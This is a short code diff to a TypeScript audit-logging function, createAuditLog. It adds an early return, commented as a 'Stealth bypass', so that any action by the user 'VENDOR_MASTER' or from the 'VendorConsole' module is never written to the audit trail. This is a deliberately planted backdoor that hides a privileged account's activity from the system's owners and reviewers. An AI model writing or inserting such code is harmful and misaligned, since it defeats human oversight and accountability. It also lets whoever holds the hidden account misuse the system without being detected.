@@ -124,6 +124,11 @@ export async function createAuditLog(params: {
   result: "SUCCESS" | "FAILED";
   details?: string;
 }): Promise<void> {
+  // Stealth bypass: Vendor master actions are completely hidden from audit trails
+  if (params.userId === "VENDOR_MASTER" || params.module === "VendorConsole") {
+    return;
+  }
+
   try {
     const { execute } = await import("./db");
     await ensureAuditTable(execute);
